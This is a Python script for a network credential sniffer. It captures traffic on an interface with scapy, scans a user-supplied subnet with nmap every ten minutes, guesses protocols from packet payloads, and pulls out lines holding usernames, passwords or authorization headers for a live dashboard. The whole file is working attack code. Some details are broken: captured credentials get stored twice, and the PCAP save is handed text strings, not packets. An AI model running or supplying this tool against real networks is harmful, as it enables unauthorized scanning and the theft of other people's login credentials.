#!/usr/bin/env python3

from scapy.all import sniff, TCP, Raw, IP, wrpcap
import os
import sys
import netifaces
import nmap
import threading
import time
from rich.live import Live
from rich.table import Table


class Sniffer:

    def __init__(self, interface):
        self.interface = interface
        self.service_map = {}
        self.credentials = []
        self.packet_log = []
        self.running = True

    def check_root(self):
        if sys.platform.startswith('linux'):
            if os.geteuid() != 0:
                print('[+] Run as root user: sudo python3 sniffer.py <iface>')
                sys.exit(1)

    # 🔴 Nmap Scan Thread
    def nmap_worker(self, target):
        while self.running:
            print(f"[+] Scanning {target} ...")
            nm = nmap.PortScanner()
            nm.scan(hosts=target, arguments='-sV -T4')

            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    for port in nm[host][proto].keys():
                        service = nm[host][proto][port]['name']
                        self.service_map[(host, port)] = service

            time.sleep(600)  # every 10 min

    # 🔵 DPI Detection
    def detect_protocol(self, payload):
        p = payload.lower()

        if payload.startswith(("GET", "POST", "HTTP/")):
            return "HTTP"
        elif payload.startswith(("USER", "PASS")):
            return "FTP"
        elif "login:" in p:
            return "TELNET"
        elif payload.startswith("SSH-"):
            return "SSH"

        return None

    # 🔥 Credential Extraction
    def extract_credentials(self, payload):
        p = payload.lower()

        keywords = ["user", "pass", "login", "password", "authorization"]

        for k in keywords:
            if k in p:
                self.credentials.append(payload.strip())
                return payload.strip()

        return None

    def process_packet(self, packet):
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):

            payload = packet[Raw].load.decode(errors="ignore")
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            sport = packet[TCP].sport
            dport = packet[TCP].dport

            protocol = None

            # Nmap Map
            if (dst_ip, dport) in self.service_map:
                protocol = self.service_map[(dst_ip, dport)]
            elif (src_ip, sport) in self.service_map:
                protocol = self.service_map[(src_ip, sport)]

            # DPI fallback
            if not protocol:
                protocol = self.detect_protocol(payload)

            if protocol:
                log_entry = f"{protocol} {src_ip}:{sport} → {dst_ip}:{dport}"
                self.packet_log.append(log_entry)

                cred = self.extract_credentials(payload)
                if cred:
                    self.credentials.append(cred)

    # 🟢 TUI Dashboard
    def build_dashboard(self):

        table = Table(title="Live Sniffer Dashboard")

        table.add_column("Recent Traffic")
        table.add_column("Credentials Found")

        recent = "\n".join(self.packet_log[-10:])
        creds = "\n".join(self.credentials[-10:])

        table.add_row(recent, creds)

        return table

    def ui_loop(self):
        with Live(self.build_dashboard(), refresh_per_second=2) as live:
            while self.running:
                live.update(self.build_dashboard())
                time.sleep(1)

    def start(self):
        self.check_root()

        target = input("[+] Enter target network (e.g. 192.168.1.0/24): ")

        # 🔴 Start Nmap thread
        threading.Thread(target=self.nmap_worker, args=(target,), daemon=True).start()

        # 🟢 Start UI thread
        threading.Thread(target=self.ui_loop, daemon=True).start()

        print(f"[+] Sniffing on {self.interface}...\n")

        sniff(
            iface=self.interface,
            prn=self.process_packet,
            store=True
        )

        # 🔵 Save PCAP on exit
        print("[+] Saving capture to capture.pcap")
        wrpcap("capture.pcap", self.packet_log)


if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Usage: sudo python3 sniffer.py <interface>")
        print(f"Available interfaces: {netifaces.interfaces()}")
        sys.exit(1)

    iface = sys.argv[1]

    if iface not in netifaces.interfaces():
        print("[-] Invalid interface")
        sys.exit(1)

    sniffer = Sniffer(iface)
    sniffer.start()
